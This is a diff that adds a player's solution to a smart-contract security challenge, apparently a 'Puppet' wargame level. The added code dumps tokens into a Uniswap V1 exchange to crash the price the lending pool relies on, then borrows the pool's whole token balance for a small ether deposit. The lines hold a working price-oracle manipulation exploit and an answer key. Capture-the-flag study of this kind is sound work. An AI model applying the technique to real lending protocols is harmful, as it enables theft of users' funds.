@@ -92,8 +92,14 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
-    }
+        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV1Exchange.tokenToEthTransferInput(PLAYER_INITIAL_TOKEN_BALANCE, 9 ether, block.timestamp, player);
+
+        lendingPool.borrow{value : 22 ether}(token.balanceOf(address(lendingPool)), recovery); 
+
+        assertEq(token.balanceOf(address(lendingPool)), 0);
+        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE);
+   }
 
     // Utility function to calculate Uniswap prices
     function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
